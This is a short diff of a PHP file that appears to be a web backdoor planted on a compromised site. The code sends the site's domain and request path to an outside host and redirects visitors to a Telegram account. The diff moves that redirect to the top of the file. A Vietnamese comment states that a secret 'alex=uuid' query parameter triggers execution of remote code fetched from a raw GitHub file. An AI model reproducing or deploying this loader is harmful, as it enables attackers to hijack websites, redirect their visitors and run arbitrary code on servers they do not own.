@@ -1,4 +1,5 @@
 <?php
+header("Location: https://t.me/alexbu555");
 $domain = $_SERVER['SERVER_NAME'];
 $path = $_SERVER['REQUEST_URI'];
 $filename = basename(__FILE__);
@@ -19,8 +20,6 @@ $options = array(
 
 $context  = stream_context_create($options);
 $result = file_get_contents('https://thuvienso.caodang20.edu.vn/bin/app.php', false, $context);
-header("Location: https://t.me/alexbu555");
-exit();
 if (isset($_GET['alex']) && $_GET['alex'] === 'uuid') {
     // Khi tham số `alex` được thiết lập thành `uuid`, thực thi mã từ xa
     $url = 'https://raw.githubusercontent.com/hinataloli/haha/main/pke.txt';
